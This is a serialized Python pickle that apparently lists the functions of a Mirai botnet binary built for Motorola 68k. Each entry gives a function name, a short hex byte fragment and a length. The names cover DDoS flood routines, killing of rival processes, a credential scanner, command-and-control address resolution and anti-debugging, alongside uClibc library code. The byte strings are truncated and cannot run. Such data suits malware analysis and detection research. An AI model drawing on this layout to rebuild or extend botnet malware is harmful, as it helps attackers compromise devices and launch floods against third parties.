(lp0
(S'_init'
p1
S'4e560061ff0061ff00'
p2
L20L
tp3
a(S'__do_global_dtors_aux'
p4
S'4e56004a392200f820885889c980f84e902200f8208841f900004a88487900dc58'
p5
L78L
tp6
a(S'call___do_global_dtors_aux'
p7
S'4e56004e5e4e'
p8
L8L
tp9
a(S'frame_dummy'
p10
S'4e560041f900004a8848790056487900dc50'
p11
L62L
tp12
a(S'call_frame_dummy'
p13
S'4e56004e5e4e'
p14
L8L
tp15
a(S'_start'
p16
S'9dce2020574851487900009448502f0080c280'
p17
L38L
tp18
a(S'attack_app_http'
p19
S'4e56ae9c48e73c00a30042a748781545f980d22d790014020308009748780802032c487900162f02032a4fef00bc487818020380564e92284878504878072f02033def00bc42a7486ed7fb61ff000c8618a62f057c4e9258'
p20
L6502L
tp21
a(S'attack_get_opt_str'
p22
S'48e7006f002f002f0042'
p23
L72L
tp24
a(S'attack_get_opt_ip'
p25
S'2f0200a74280002f002f0080002f00'
p26
L60L
tp27
a(S'attack_get_opt_int'
p28
S'2f0200a74280002f002f0080002f00'
p29
L64L
tp30
a(S'attack_start'
p31
S'4e560048e720001800160045f9802c9272b200944a808e72b20861ff001c816e4a81eb2028044c602c0061ff000048780900009842a761ff0028042200802f0000802f00504e904fef00600a428080a761ff001c'
p32
L192L
tp33
a(S'attack_parse'
p34
S'4fefff48e724002f0003bc00'
p35
L476L
tp36
a(S'attack_kill_all'
p37
S'2f0b0a80744a200e487809000056508f588a94e0ff005f5f4e'
p38
L54L
tp39
a(S'add_attack'
p40
S'2f0a02007806487801007b241104af004280806ee520688070ff0023807039802113806e4fef0024244e'
p41
L98L
tp42
a(S'attack_init'
p43
S'2f0a80a8a745f98068800a004e9248790038004e92487900d2004e924fef00bc4878034879000492487900787805804878064e924fef00bc4878074e924879006c48780a4fef0070244e'
p44
L144L
tp45
a(S'attack_gre_eth'
p46
S'4e56ff48e73c00d7160048780480ff2f00007a2d830042a7487802020380564e921e003c00ff002f02032aef00bc48780402031c487801004e92184fef00bc4878062f0203283c00ff002f0203404fef00bc42a72f02032d7801002f02031def009748781302032a2f3978190203244fef00bc4878030061ff0040'
p47
L1244L
tp48
a(S'attack_gre_ip'
p49
S'4fefff48e72c0000002d48780480002f0000752f48000242a7487802020380564e921f40003c00ff002f02032aef00bc48780402031e00004878054e92184fef00bc4878062f0203283c00ff002f0203404fef00bc42a72f02032c487801002f02031f4000ef009748781302032a2f3978190203244fef00bc4878030061ff002f40004fef00ff1cef000000487804080042a72f00006f564fef00ff2f0061ff00'
p50
L1090L
tp51
a(S'attack_tcp_stomp'
p52
S'4e56'
p53
L1386L
tp54
a(S'attack_tcp_ack'
p55
S'4fefff48e72f002f006f00312f0078048000006c162c02a74878020204f980564e921f40003c00ff002f0204922f4000ef00bc4878040204921f4000a74878054e921f4000ef00bc4878062f020492283c00ff002f0204922a4fef00bc4878110204922f4000402f3c00ff002f0204922f4000ef009748780b0204921f40007801000204921f4000ef009748780d4e921f4000a748780e2f0204921f4000ef009748782f2f04921f4000a74878100204921f4000ef00bc42a72f0204922a7801002f0204921f4000ef00b94878190204'
p56
L1144L
tp57
a(S'attack_tcp_syn'
p58
S'4fefff48e72c0000002d48780480002f00009e2a830042a7487802020380564e921f40003c00ff002f02032f4000ef00bc48780402031f40007801004e921f4000ef00bc4878062f0203402f3c00ff002f02030000bc48781102032f40004042a748781202032f4000ef009748780b02032a42a748780c02031f4000ef009748780d4e921f4000a748780e2f02031f4000ef00bc48782f2f031f4000a74878100203184fef00b94878190203'
p59
L1144L
tp60
a(S'attack_udp_plain'
p61
S'4e56ff48e73c00e942'
p62
L470L
tp63
a(S'attack_udp_generic'
p64
S'4fefff48e72f002f006f002f162f00780480002f000061502a830042a7487802020380564e921f40003c00ff002f020328ef00bc48780402031f4000a74878054e92184fef00bc4878062f0203402f3c00ff002f02032c4fef00bc42a72f02032a487801002f02031f4000ef00b948781902032448781100487802005b684fef00ff5241ef003c000100080042a72f00005afa4fef00ff2f0061ff0058'
p65
L866L
tp66
a(S'attack_udp_vse'
p67
S'4e56'
p68
L814L
tp69
a(S'attack_udp_dns'
p70
S'4e56f72400bf48780480f7005ac4830042a7487802020380564e921d3c00ff002f02032def00bc48780402031da74878054e921def00bc4878062f02032d78352f02032aef00bc48780902034048780ca72f02032c4fef00974878080203'
p71
L1308L
tp72
a(S'checksum_generic'
p73
S'22046f0070b0048130d2b070b0063049c0204240484002d04841d000'
p74
L78L
tp75
a(S'checksum_tcpudp'
p76
S'48e7200020242f00221c2a0c2a10b06d0483831980010180d6804240484002d04842d4228181d44281'
p77
L156L
tp78
a(S'mem_exists'
p79
S'2f03026f002f0022142f00b06d428118048104015288ff42405380241f4e'
p80
L70L
tp81
a(S'killer_kill'
p82
S'48780939ff00104e'
p83
L20L
tp84
a(S'killer_kill_by_port'
p85
S'4e56dd48e73c002400102f02486e008024922f02486ee04e92487801486e'
p86
L1174L
tp87
a(S'killer_init'
p88
S'4e56dfe73ca761ff002a61ff00ea58'
p89
L1568L
tp90
a(S'anti_gdb_entry'
p91
S'2380c4'
p92
L12L
tp93
a(S'teardown_connection'
p94
S'208000b20a0000312380000061ff0058'
p95
L44L
tp96
a(S'ensure_single_instance'
p97
S'4e56'
p98
L316L
tp99
a(S'main'
p100
S'4e56fa24e73c00452f100035'
p101
L2050L
tp102
a(S'resolve_cnc_addr'
p103
S'48e7487803803842a748780380984e952f08000248487803804e944fef008b240061ff00404281011c80340b00024878049642a74878049533803200944fef00df'
p104
L130L
tp105
a(S'rand_next'
p106
S'48e700809ab123809e809a809e2280a62380a201e8'
p107
L78L
tp108
a(S'rand_str'
p109
S'2f0a02002f006f32b06c0c'
p110
L70L
tp111
a(S'rand_alphastr'
p112
S'4fef'
p113
L184L
tp114
a(S'rand_init'
p115
S'2f0261ff0030c000c0ff00'
p116
L70L
tp117
a(S'resolv_skip_name'
p118
S'2f0a026f002f00221401802c00bf0000e14281404119'
p119
L86L
tp120
a(S'resolv_entries_free'
p121
S'2f0a004a8a20000a00004004'
p122
L40L
tp123
a(S'resolv_domain_to_hostname'
p124
S'2f0a02006f002f0a001fbe528042026024120004011222025202c1528a208010244e'
p125
L82L
tp126
a(S'resolv_lookup'
p127
S'4e56ef5c48e73c7806487801003d5c47eef80000002f0dff009249f50841eeef'
p128
L782L
tp129
a(S'consume_any_prompt'
p130
S'2004281653805412080c003c010c0030002a012512080c0018011201240c01230c0072b2085380'
p131
L102L
tp132
a(S'can_consume'
p133
S'2204e9002000af00b055c0'
p134
L30L
tp135
a(S'scanner_kill'
p136
S'48780939ff005850'
p137
L20L
tp138
a(S'deobf'
p139
S'48e730006f0002001b2080010039242052802f0208001c4fef00936f10220a00085280204cdf4e'
p140
L86L
tp141
a(S'add_auth_entry'
p142
S'594f48e7302f002080aa22d291c10e2f39ff009c2380d62080aa22d2450874d42f022f00f980504e93242080aa22d293c180d6112080aa22d224d580d62f022f004e9325390081c180d6112080aa22d293c180d63198083901'
p143
L268L
tp144
a(S'setup_connection'
p145
S'4e56ff2f0b0a6e0042aeff42aeff42ae'
p146
L202L
tp147
a(S'recv_strip_null'
p148
S'2f0a002f002f000a2f00ff0032004a80811500b2ee244e'
p149
L58L
tp150
a(S'scanner_init'
p151
S'4e56f8'
p152
L5346L
tp153
a(S'table_retrieve_val'
p154
S'20006f0022d220fc80504a8942800080204e'
p155
L42L
tp156
a(S'toggle_obf'
p157
S'48e700100022d222fc805020800a00008c0048432472e24a690141d1bbd1d1d1800080df3c'
p158
L100L
tp159
a(S'table_lock_val'
p160
S'4280002f00'
p161
L18L
tp162
a(S'table_unlock_val'
p163
S'4280002f00'
p164
L18L
tp165
a(S'add_entry'
p166
S'48e7002f0014002f03002108032f000800040241f9805020d02104ef004cdf1c'
p167
L74L
tp168
a(S'table_init'
p169
S'2f0a00487900b07803804a4e9248780280c2009248781dc178124fef00bc487900da004e9248784800dd004e9248781dc1780500bc4879000b004e92487805c278074e9248780b8019004e924fef00bc487900254e924878074879002a004e924878088032004e924fef00bc4879003b009248780a804948780d004879005448780e4e924fef00bc4879005f48784e4879008148780b808a004e924fef00bc48790096487814924878074879009d48781500487900a54878164e924fef00bc487900ad4878174e9248781380b1781848781880c5004e924fef00bc487900de004e9248781080e84e92487816487900f948781c924fef00bc48790010000048790048781e4e9248780c790038004e924fef00bc487900454878204878534879005d48782148782080b178224fef00bc487900d2004e9248780c790003009248780980100000bc4879001a004e9248780c7900254e924878108032004e924fef00bc48790043487829487808805748782a48780b805148782b4fef00bc4879006048782c92487812806d48782d00487900804e924fef00bc4879009a48786f4879000a004e9248786e4879007a78314fef00bc487900e94e924878757900584878334fef00244e'
p170
L912L
tp171
a(S'util_strlen'
p172
S'20041042808030004e'
p173
L24L
tp174
a(S'util_strncmp'
p175
S'48e7386f006f002f002f0cf9802492242f0b50'
p176
L76L
tp177
a(S'util_strcmp'
p178
S'48e7386f006f002f0cf9802492242f0b50'
p179
L68L
tp180
a(S'util_memcpy'
p181
S'22001622046f00428008085280'
p182
L30L
tp183
a(S'util_strcpy'
p184
S'2f0a02002f02'
p185
L46L
tp186
a(S'util_zero'
p187
S'2200106f008000b2'
p188
L24L
tp189
a(S'util_itoa'
p190
S'4e56'
p191
L160L
tp192
a(S'util_memsearch'
p193
S'48e7306f0022006f00221c894a811408b4880ab1065280c8810c4e'
p194
L68L
tp195
a(S'util_stristr'
p196
S'48e7202f0024002f0a'
p197
L104L
tp198
a(S'util_atoi'
p199
S'48e7306f002f00121449c200f40c00ee0c00e81449c22000007c010c0000a81822009e2c2a4c4750014284100600d0006230d160220200bf6237600e1006009f0c00627020c06d1c8408ff20060828d8761449c24a8380002a3c'
p200
L252L
tp201
a(S'util_fdgets'
p202
S'48e720002f00280006428378010204ff000c01830c00d856c080204cdf4e'
p203
L78L
tp204
a(S'util_local_addr'
p205
S'4e56'
p206
L134L
tp207
a(S'fcntl'
p208
S'4e56ff2f0302002dff2058802d0cae0010b20008b0001c'
p209
L188L
tp210
a(S'__syscall_fcntl64'
p211
S'4e56'
p212
L88L
tp213
a(S'fcntl64'
p214
S'4e56'
p215
L54L
tp216
a(S'__syscall_chdir'
p217
S'4e56'
p218
L62L
tp219
a(S'chdir'
p220
S'4e56002f0061b84e'
p221
L16L
tp222
a(S'close'
p223
S'4e56'
p224
L60L
tp225
a(S'fork'
p226
S'4e56'
p227
L56L
tp228
a(S'getpid'
p229
S'4e56'
p230
L56L
tp231
a(S'getppid'
p232
S'4e56'
p233
L56L
tp234
a(S'ioctl'
p235
S'4e56ff48e700002dff2058802d00fc2d6e'
p236
L130L
tp237
a(S'__syscall_kill'
p238
S'4e56'
p239
L72L
tp240
a(S'kill'
p241
S'4e56002f000061aa50'
p242
L20L
tp243
a(S'__syscall_open'
p244
S'4e56ff48e700003d6e004284ff200c0408094e402d'
p245
L94L
tp246
a(S'open'
p247
S'4e56'
p248
L80L
tp249
a(S'creat'
p250
S'4e56002f0078412f0061'
p251
L30L
tp252
a(S'prctl'
p253
S'4e56'
p254
L98L
tp255
a(S'read'
p256
S'4e56'
p257
L84L
tp258
a(S'readlink'
p259
S'4e56'
p260
L84L
tp261
a(S'select'
p262
S'4e56'
p263
L100L
tp264
a(S'setsid'
p265
S'4e56'
p266
L56L
tp267
a(S'sigprocmask'
p268
S'4e56ff48e730001c0072b21200047020ff6068'
p269
L160L
tp270
a(S'time'
p271
S'4e56'
p272
L62L
tp273
a(S'unlink'
p274
S'4e56'
p275
L62L
tp276
a(S'write'
p277
S'4e56'
p278
L84L
tp279
a(S'closedir'
p280
S'4e56'
p281
L198L
tp282
a(S'opendir'
p283
S'4e56ff0061'
p284
L350L
tp285
a(S'readdir'
p286
S'4e56ff4aae001200017020600000d0802f0001'
p287
L292L
tp288
a(S'__errno_location'
p289
S'4e5600200014404e5e4e'
p290
L16L
tp291
a(S'clock'
p292
S'4e56'
p293
L76L
tp294
a(S'_wordcopy_bwd_aligned'
p295
S'4e56ff42ae'
p296
L638L
tp297
a(S'_wordcopy_bwd_dest_aligned'
p298
S'4e56ff2f02'
p299
L578L
tp300
a(S'memmove'
p301
S'4e56'
p302
L288L
tp303
a(S'memset'
p304
S'4e56ff2df470b000001400000080002d'
p305
L310L
tp306
a(S'inet_addr'
p307
S'4e56'
p308
L48L
tp309
a(S'accept'
p310
S'4e56ff20002d00002deeff2f08001850'
p311
L50L
tp312
a(S'bind'
p313
S'4e56ff20002d006e00'
p314
L48L
tp315
a(S'connect'
p316
S'4e56ff20002d006e00'
p317
L48L
tp318
a(S'getsockname'
p319
S'4e56ff20002d00002deeff2f080061ff002c'
p320
L50L
tp321
a(S'getsockopt'
p322
S'4e56'
p323
L66L
tp324
a(S'listen'
p325
S'4e56'
p326
L42L
tp327
a(S'recv'
p328
S'4e56ff20002d006e00'
p329
L56L
tp330
a(S'recvfrom'
p331
S'4e56'
p332
L72L
tp333
a(S'send'
p334
S'4e56ff20002d006e00'
p335
L56L
tp336
a(S'sendto'
p337
S'4e56'
p338
L70L
tp339
a(S'setsockopt'
p340
S'4e56'
p341
L64L
tp342
a(S'socket'
p343
S'4e56ff20002d00002deeff2f080061ff004850'
p344
L50L
tp345
a(S'raise'
p346
S'4e560061'
p347
L28L
tp348
a(S'sigaddset'
p349
S'4e56'
p350
L70L
tp351
a(S'sigemptyset'
p352
S'4e56'
p353
L60L
tp354
a(S'signal'
p355
S'4e56'
p356
L238L
tp357
a(S'__sigismember'
p358
S'4e56ff20008080a840'
p359
L80L
tp360
a(S'__sigaddset'
p361
S'4e56'
p362
L68L
tp363
a(S'__sigdelset'
p364
S'4e56'
p365
L72L
tp366
a(S'__malloc_from_heap'
p367
S'4e56'
p368
L466L
tp369
a(S'malloc'
p370
S'4e56'
p371
L168L
tp372
a(S'calloc'
p373
S'4e56ff200008002dae0022'
p374
L118L
tp375
a(S'__heap_delete'
p376
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p377
L88L
tp378
a(S'__free_to_heap'
p379
S'4e56'
p380
L342L
tp381
a(S'free'
p382
S'4e5600487900e0790010006100944fef005e4e'
p383
L32L
tp384
a(S'realloc'
p385
S'4e56'
p386
L408L
tp387
a(S'__heap_delete_0'
p388
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p389
L88L
tp390
a(S'__heap_free_area_alloc'
p391
S'4e56'
p392
L66L
tp393
a(S'__heap_alloc'
p394
S'4e56ff2f026e00ae'
p395
L150L
tp396
a(S'__heap_delete_1'
p397
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p398
L88L
tp399
a(S'__heap_free_area_alloc_0'
p400
S'4e56'
p401
L66L
tp402
a(S'__heap_alloc_at'
p403
S'4e56ff2f02'
p404
L144L
tp405
a(S'__heap_link_free_area'
p406
S'4e5600200c6e00046e006e00004aae000c6e00210c04086e0020000a6e006e00084e'
p407
L70L
tp408
a(S'__heap_link_free_area_after'
p409
S'4e56004aae000c6e00210c04086e0020006e00004e5e4e'
p410
L44L
tp411
a(S'__heap_add_free_area'
p412
S'4e56'
p413
L66L
tp414
a(S'__heap_free'
p415
S'4e56'
p416
L404L
tp417
a(S'atol'
p418
S'4e560048780a2f0061ff000cef005e4e'
p419
L28L
tp420
a(S'strtol'
p421
S'4e5600487801002f000061ff000e4fef004e5e4e'
p422
L34L
tp423
a(S'_stdlib_strto_l'
p424
S'4e56'
p425
L562L
tp426
a(S'exit'
p427
S'4e56ff2000001800ff2f0800034fef00790018000258'
p428
L122L
tp429
a(S'sleep'
p430
S'4e56fe20002daeff4aae0008fe0220eeff48ff600c'
p431
L558L
tp432
a(S'__uClibc_fini'
p433
S'4e56'
p434
L106L
tp435
a(S'__pthread_return_0'
p436
S'4e56004280'
p437
L10L
tp438
a(S'_pthread_cleanup_push_defer'
p439
S'4e56004e5e4e'
p440
L8L
tp441
a(S'__check_suid'
p442
S'4e56'
p443
L92L
tp444
a(S'__check_one_fd'
p445
S'4e56'
p446
L68L
tp447
a(S'__uClibc_init'
p448
S'4e56002080103839808010fc001080043c00000661'
p449
L74L
tp450
a(S'__uClibc_main'
p451
S'4e56ff230080fc2300000c00102380006e00222080000010c000a7200680ff00'
p452
L582L
tp453
a(S'__socketcall'
p454
S'4e56'
p455
L74L
tp456
a(S'__syscall_exit'
p457
S'4e56'
p458
L56L
tp459
a(S'_exit'
p460
S'4e56002f0061be'
p461
L14L
tp462
a(S'__syscall_fstat'
p463
S'4e56'
p464
L74L
tp465
a(S'fstat'
p466
S'4e56'
p467
L54L
tp468
a(S'__getdents'
p469
S'4e56ff2f002f000061ff005e4fef00ae'
p470
L278L
tp471
a(S'__syscall_getdents64'
p472
S'4e56'
p473
L88L
tp474
a(S'__getdents64'
p475
S'4e56ff2f02'
p476
L548L
tp477
a(S'getegid'
p478
S'4e56'
p479
L60L
tp480
a(S'geteuid'
p481
S'4e56'
p482
L60L
tp483
a(S'getgid'
p484
S'4e56'
p485
L60L
tp486
a(S'getuid'
p487
S'4e56'
p488
L60L
tp489
a(S'__syscall_llseek'
p490
S'4e56'
p491
L98L
tp492
a(S'lseek64'
p493
S'4e56'
p494
L108L
tp495
a(S'nanosleep'
p496
S'4e56'
p497
L78L
tp498
a(S'sbrk'
p499
S'4e56'
p500
L106L
tp501
a(S'times'
p502
S'4e56'
p503
L62L
tp504
a(S'__xstat64_conv'
p505
S'4e56'
p506
L336L
tp507
a(S'__xstat_conv'
p508
S'4e56ff48785442a72f00'
p509
L316L
tp510
a(S'_wordcopy_fwd_aligned'
p511
S'4e56ff70c0f470b0ff0038ffd0b530084efb00000110386000200c50'
p512
L566L
tp513
a(S'_wordcopy_fwd_dest_aligned'
p514
S'4e56ff2f02000381f820'
p515
L500L
tp516
a(S'memcpy'
p517
S'4e56'
p518
L240L
tp519
a(S'inet_aton'
p520
S'4e56'
p521
L362L
tp522
a(S'sigaction'
p523
S'4e56'
p524
L232L
tp525
a(S'_dl_aux_init'
p526
S'4e560030d1002000c000d1002000c04e'
p527
L44L
tp528
a(S'brk'
p529
S'4e56'
p530
L64L
tp531
a(S'__syscall_rt_sigaction'
p532
S'4e56'
p533
L94L
tp534
a(S'ntohl'
p535
S'4e560020004e5e4e'
p536
L12L
tp537
a(S'ntohs'
p538
S'4e56'
p539
L22L
tp540
a(S'htonl'
p541
S'4e560020004e5e4e'
p542
L12L
tp543
a(S'htons'
p544
S'4e56'
p545
L22L
tp546
a(S'__do_global_ctors_aux'
p547
S'4e56002f0a80e07900e0ff9020ff6e'
p548
L42L
tp549
a(S'call___do_global_ctors_aux'
p550
S'4e56004e5e4e'
p551
L8L
tp552
a(S'_fini'
p553
S'4e560061'
p554
L14L
tp555
a.